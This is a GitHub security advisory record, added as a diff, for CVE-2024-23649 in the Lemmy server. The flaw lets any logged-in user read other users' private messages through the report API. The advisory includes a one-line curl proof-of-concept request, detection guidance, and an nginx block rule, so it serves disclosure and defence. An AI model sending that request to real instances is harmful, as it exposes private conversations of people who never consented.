@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-r64r-5h43-26qv",
+  "modified": "2024-01-24T21:13:39Z",
+  "published": "2024-01-24T21:13:39Z",
+  "aliases": [
+    "CVE-2024-23649"
+  ],
+  "summary": "Any authenticated user may obtain private message details from other users on the same instance",
+  "details": "### Summary\nUsers can report private messages, even when they're neither sender nor recipient of the message.\nThe API response to creating a private message report contains the private message itself, which means any user can just iterate over message ids to (loudly) obtain all private messages of an instance.\nA user with instance admin privileges can also abuse this if the private message is removed from the response, as they're able to see the resulting reports.\n\n### Details\nCreating a private message report by POSTing to `/api/v3/private_message/report` does not validate whether the reporter is the recipient of the message.\nAt least lemmy-ui does not allow the sender to report the message; the API method should likely be restricted to accessible to recipients only.\nThe API response when creating a report contains the `private_message_report_view` with all the details of the report, including the private message that has been reported:\n<details>\n\n<summary>Example response</summary>\n\nIn the report below, the creator with id 3 is different from the private message creator (id 2) and private message recipient (id 6).\n\n```json\n{\n  \"private_message_report_view\": {\n    \"private_message_report\": {\n      \"id\": 14,\n      \"creator_id\": 3,\n      \"private_message_id\": 7,\n      \"original_pm_text\": \"testfoo\",\n      \"reason\": \"reporting id 7\",\n      \"resolved\": false,\n      \"published\": \"2023-12-15T19:23:03.441967Z\"\n    },\n    \"private_message\": {\n      \"id\": 7,\n      \"creator_id\": 2,\n      \"recipient_id\": 6,\n      \"content\": \"testfoo\",\n      \"deleted\": false,\n      \"read\": false,\n      \"published\": \"2023-12-15T19:21:41.920872Z\",\n      \"ap_id\": \"https://1b1w56.lem.rocks/private_message/7\",\n      \"local\": true\n    },\n    \"private_message_creator\": {\n      \"id\": 2,\n      \"name\": \"admin\",\n      \"banned\": false,\n      \"published\": \"2023-12-14T23:45:05.055427Z\",\n      \"actor_id\": \"https://1b1w56.lem.rocks/u/admin\",\n      \"local\": true,\n      \"deleted\": false,\n      \"bot_account\": false,\n      \"instance_id\": 1\n    },\n    \"creator\": {\n      \"id\": 3,\n      \"name\": \"testuser1\",\n      \"banned\": false,\n      \"published\": \"2023-12-14T23:47:57.571772Z\",\n      \"actor_id\": \"https://1b1w56.lem.rocks/u/testuser1\",\n      \"local\": true,\n      \"deleted\": false,\n      \"bot_account\": false,\n      \"instance_id\": 1\n    }\n  }\n}\n```\n\n</details>\n\nIf these details were not available in the response, but reports could still be created by any user, or at least by any admin, this would allow an instance admin to create reports and obtain the message contents from the report system.\n\nThis was originally discovered from incorrect reports on a 0.18.5 instance and has been replicated in a 0.19.0 test environment.\n\n### PoC\n\n```bash\ncurl -v 'https://myinstance.tld/api/v3/private_message/report' -X POST -H 'Content-Type: application/json' -H 'authorization: Bearer ...' --data-raw '{\"private_message_id\":1,\"reason\":\"i like reports\"}'\n```\n\n### Impact\nAny authenticated user can obtain arbitrary (untargeted) private message contents.\nPrivileges required depend on the instance configuration; when registratons are enabled without application system, the privileges required are practically none.\nWhen registration applications are required, privileges required could be considered low, but this assessment heavily varies by instance.\n\n### Detection\n\nAny private message reports where the report creator is not equal to the private message recipient may be an attempt to exploit this.\nAs this was originally discovered from an incorrect report, likely related to a bug in a client app, it should be noted that not all mismatching reports should be considered malicious; though a frequent occurrence of them likely indicates an exploitation attempt.\n\n### Workaround when updating is not immediately possible\n\nIf an update to a fixed Lemmy version is not immediately possible, the API route can be blocked in the reverse proxy.\nThis will prevent anyone from reporting private messages, but it will also prevent exploitation before the update has been applied.\n\nnginx example:\n```nginx\nlocation = /api/v3/private_message/report {\n  default_type application/json;\n  return 403 '{\"error\":\"couldnt_create_report\"}';\n}\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "lemmy_server"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.17.0"
+            },
+            {
+              "fixed": "0.19.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/LemmyNet/lemmy/security/advisories/GHSA-r64r-5h43-26qv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23649"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LemmyNet/lemmy/commit/bc32b408b523b9b64aa57b8e47748f96cce0dae5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/LemmyNet/lemmy"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-200"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-01-24T21:13:39Z",
+    "nvd_published_at": "2024-01-24T18:15:09Z"
+  }
+}
